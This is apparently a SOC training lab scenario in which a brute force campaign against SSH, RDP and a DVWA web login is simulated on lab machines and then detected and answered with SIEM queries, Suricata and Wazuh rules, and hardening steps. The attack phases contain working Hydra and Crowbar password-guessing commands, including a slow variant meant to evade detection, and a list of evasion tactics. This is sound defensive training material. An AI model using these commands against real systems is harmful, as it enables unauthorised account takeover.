# Attack Scenario 1: Brute Force Attack Campaign

## Scenario Overview
This scenario simulates a brute force attack campaign targeting SSH, RDP, and web application login forms. SOC analysts will practice detecting, analyzing, and responding to credential-based attacks.

## Learning Objectives
- Detect brute force attacks in log data
- Analyze attack patterns and source IPs
- Create detection rules and alerts
- Implement response procedures
- Generate incident reports

## Attack Timeline
**Duration**: 2-3 hours  
**Difficulty**: Beginner  
**Prerequisites**: Basic understanding of authentication logs

## Lab Setup

### Target Systems
- **Ubuntu Vulnerable VM** (10.0.2.101) - SSH brute force target
- **Windows 10 Vulnerable VM** (10.0.2.102) - RDP brute force target
- **Web Application** (10.0.2.101:80/dvwa) - Web login brute force

### Monitoring Systems
- **ELK SIEM** (10.0.2.100) - Log collection and analysis
- **Network monitoring** - Traffic analysis

## Attack Execution

### Phase 1: SSH Brute Force Attack (15 minutes)

#### Attacker Actions (Kali Linux)
```bash
# Target: Ubuntu SSH service
# Tool: Hydra
# Wordlist: Common passwords

# Single user brute force
hydra -l vulnerable -P /usr/share/wordlists/rockyou.txt 10.0.2.101 ssh -t 4 -V

# Multiple users brute force
hydra -L /usr/share/wordlists/custom/usernames.txt -P /usr/share/wordlists/custom/passwords.txt 10.0.2.101 ssh -t 4

# Slow brute force to evade detection
hydra -l admin -P /usr/share/wordlists/custom/passwords.txt 10.0.2.101 ssh -t 1 -w 30
```

#### Expected Logs Generated
```bash
# /var/log/auth.log on Ubuntu target
Dec 06 10:15:23 ubuntu sshd[1234]: Failed password for vulnerable from 10.0.2.15 port 45678 ssh2
Dec 06 10:15:25 ubuntu sshd[1235]: Failed password for vulnerable from 10.0.2.15 port 45679 ssh2
Dec 06 10:15:27 ubuntu sshd[1236]: Failed password for admin from 10.0.2.15 port 45680 ssh2
Dec 06 10:15:29 ubuntu sshd[1237]: Failed password for root from 10.0.2.15 port 45681 ssh2
```

### Phase 2: RDP Brute Force Attack (15 minutes)

#### Attacker Actions
```bash
# Target: Windows RDP service
# Tool: Crowbar/Hydra

# RDP brute force
crowbar -b rdp -s 10.0.2.102/32 -u vulnerable -C /usr/share/wordlists/custom/passwords.txt

# Alternative with Hydra
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.0.2.102 -t 4
```

#### Expected Logs Generated
```powershell
# Windows Event Log - Security (Event ID 4625)
Event ID: 4625
Task Category: Logon
Level: Information
Description: An account failed to log on
Account Name: vulnerable
Source Network Address: 10.0.2.15
Failure Reason: Unknown user name or bad password
```

### Phase 3: Web Application Brute Force (20 minutes)

#### Attacker Actions
```bash
# Target: DVWA login form
# Tool: Hydra, Burp Suite

# Web form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 10

# Using Burp Suite Intruder
# 1. Capture login request
# 2. Send to Intruder
# 3. Set payload positions
# 4. Load password list
# 5. Start attack
```

#### Expected Logs Generated
```bash
# Apache access log
10.0.2.15 - - [06/Dec/2023:10:30:15 +0000] "POST /dvwa/login.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
10.0.2.15 - - [06/Dec/2023:10:30:16 +0000] "POST /dvwa/login.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
10.0.2.15 - - [06/Dec/2023:10:30:17 +0000] "POST /dvwa/login.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
```

## SOC Analysis Tasks

### Task 1: Initial Detection (30 minutes)

#### Kibana Dashboard Analysis
1. **Login to Kibana**: http://10.0.2.100:5601
2. **Navigate to Discover tab**
3. **Search for failed authentication events**:
   ```
   event_category:"ssh_failed_login" OR winlog.event_id:4625 OR response:401
   ```
4. **Create visualizations**:
   - Failed login attempts over time
   - Top source IPs
   - Top targeted usernames
   - Geographic distribution of attacks

#### Questions to Answer
- What time did the attacks start?
- How many failed login attempts were recorded?
- What usernames were targeted?
- What is the source IP of the attacks?
- Are there any successful logins from the attacker IP?

### Task 2: Pattern Analysis (45 minutes)

#### SSH Attack Analysis
```bash
# Query for SSH failed logins
program:"sshd" AND "Failed password"

# Analyze patterns:
# - Frequency of attempts
# - Username enumeration
# - Time intervals between attempts
# - Success/failure ratio
```

#### RDP Attack Analysis
```bash
# Query for Windows logon failures
winlog.event_id:4625

# Analyze patterns:
# - Account names targeted
# - Source IP addresses
# - Logon types
# - Failure reasons
```

#### Web Attack Analysis
```bash
# Query for HTTP POST requests to login pages
method:"POST" AND uri:"/dvwa/login.php"

# Analyze patterns:
# - Request frequency
# - Response codes
# - User agents
# - Session behavior
```

### Task 3: Threat Intelligence Correlation (30 minutes)

#### IP Reputation Check
1. **Extract attacker IP**: 10.0.2.15
2. **Check reputation databases**:
   - VirusTotal
   - AbuseIPDB
   - Shodan
3. **Document findings**

#### Attack Signature Creation
```bash
# Suricata rule for SSH brute force
alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force Detected"; flow:to_server,established; content:"SSH"; threshold:type both,track by_src,count 10,seconds 60; sid:1000010; rev:1;)

# Suricata rule for HTTP brute force
alert http any any -> $HOME_NET any (msg:"HTTP Login Brute Force"; flow:to_server,established; content:"POST"; http_method; content:"login"; http_uri; threshold:type both,track by_src,count 20,seconds 300; sid:1000011; rev:1;)
```

### Task 4: Impact Assessment (30 minutes)

#### Successful Compromise Analysis
```bash
# Check for successful logins after failed attempts
program:"sshd" AND "Accepted password" AND src_ip:"10.0.2.15"

# Check for privilege escalation
program:"sudo" AND user:"vulnerable"

# Check for lateral movement
program:"ssh" AND "Connection from 10.0.2.15"
```

#### Data Exfiltration Check
```bash
# Large file transfers
bytes:>1000000 AND src_ip:"10.0.2.15"

# Unusual network connections
protocol:"tcp" AND src_ip:"10.0.2.15" AND NOT dest_port:(22 OR 80 OR 443)
```

## Detection Rules

### ELK Detection Rules

#### SSH Brute Force Detection
```json
{
  "query": {
    "bool": {
      "must": [
        {
          "match": {
            "program": "sshd"
          }
        },
        {
          "match": {
            "message": "Failed password"
          }
        }
      ],
      "filter": [
        {
          "range": {
            "@timestamp": {
              "gte": "now-5m"
            }
          }
        }
      ]
    }
  },
  "aggs": {
    "by_source_ip": {
      "terms": {
        "field": "src_ip",
        "size": 10
      }
    }
  }
}
```

#### Threshold-based Alert
```yaml
# Wazuh rule for SSH brute force
<rule id="100001" level="10">
  <if_matched_sid>5716</if_matched_sid>
  <same_source_ip />
  <description>SSH brute force attack detected</description>
  <frequency>10</frequency>
  <timeframe>300</timeframe>
</rule>
```

### Splunk Detection Queries

```splunk
# SSH brute force detection
index=linux sourcetype=secure "Failed password" 
| stats count by src_ip, user 
| where count > 10

# RDP brute force detection
index=windows EventCode=4625 
| stats count by src_ip, Account_Name 
| where count > 5

# Web brute force detection
index=apache method=POST uri="*login*" status=401 
| stats count by src_ip 
| where count > 20
```

## Response Procedures

### Immediate Response (15 minutes)

1. **Block Attacker IP**
   ```bash
   # On target systems
   sudo iptables -A INPUT -s 10.0.2.15 -j DROP
   
   # On firewall
   # Add rule to block 10.0.2.15
   ```

2. **Reset Compromised Accounts**
   ```bash
   # Force password reset for targeted accounts
   sudo passwd vulnerable
   sudo passwd admin
   ```

3. **Increase Monitoring**
   ```bash
   # Enable detailed SSH logging
   echo "LogLevel VERBOSE" >> /etc/ssh/sshd_config
   systemctl restart sshd
   ```

### Investigation Phase (30 minutes)

1. **Timeline Creation**
   - First failed login attempt
   - Peak attack activity
   - Any successful logins
   - Lateral movement attempts
   - Data access attempts

2. **Affected Systems Assessment**
   - List all targeted systems
   - Check for successful compromises
   - Verify data integrity

3. **Evidence Collection**
   - Export relevant log entries
   - Capture network traffic
   - Document attack patterns

### Recovery Phase (20 minutes)

1. **System Hardening**
   ```bash
   # Implement fail2ban
   sudo apt install fail2ban
   
   # Configure SSH restrictions
   echo "MaxAuthTries 3" >> /etc/ssh/sshd_config
   echo "LoginGraceTime 30" >> /etc/ssh/sshd_config
   ```

2. **Monitoring Enhancement**
   - Deploy additional sensors
   - Create custom detection rules
   - Set up automated alerts

## Expected Findings

### Attack Characteristics
- **Duration**: 1-2 hours of continuous attacks
- **Volume**: 500+ failed login attempts
- **Targets**: SSH (port 22), RDP (port 3389), HTTP (port 80)
- **Success Rate**: Low (0-5% depending on password complexity)

### Detection Metrics
- **Time to Detection**: Should be < 5 minutes with proper monitoring
- **False Positive Rate**: Low with threshold-based detection
- **Alert Volume**: Moderate (10-50 alerts depending on rules)

## Lab Variations

### Advanced Scenarios
1. **Distributed Brute Force**: Use multiple source IPs
2. **Slow and Low**: Extended attacks with long delays
3. **Credential Stuffing**: Use known username/password combinations
4. **Password Spraying**: Try common passwords against many users

### Detection Evasion
1. **User-Agent Rotation**: Change HTTP user agents
2. **Session Management**: Maintain sessions between attempts
3. **Timing Randomization**: Vary attack intervals
4. **Protocol Switching**: Alternate between SSH and RDP

## Assessment Criteria

### Beginner Level (Pass)
- [ ] Detect brute force attacks in logs
- [ ] Identify source IP and targeted accounts
- [ ] Create basic timeline of events
- [ ] Implement IP blocking

### Intermediate Level (Good)
- [ ] Create custom detection rules
- [ ] Perform threat intelligence correlation
- [ ] Analyze attack patterns and techniques
- [ ] Generate comprehensive incident report

### Advanced Level (Excellent)
- [ ] Develop automated response procedures
- [ ] Create threat hunting queries
- [ ] Implement advanced detection logic
- [ ] Design prevention strategies

## Report Template

### Executive Summary
- Attack type and duration
- Systems affected
- Business impact
- Immediate actions taken

### Technical Details
- Attack timeline
- IOCs (Indicators of Compromise)
- Attack techniques used
- Detection methods

### Recommendations
- Short-term mitigations
- Long-term security improvements
- Monitoring enhancements
- Training requirements

## Additional Resources

### Documentation
- SSH log analysis guide
- Windows Event Log reference
- Web server log analysis
- Brute force attack patterns

### Tools
- Log analysis scripts
- Custom Kibana dashboards
- Suricata rule sets
- Response playbooks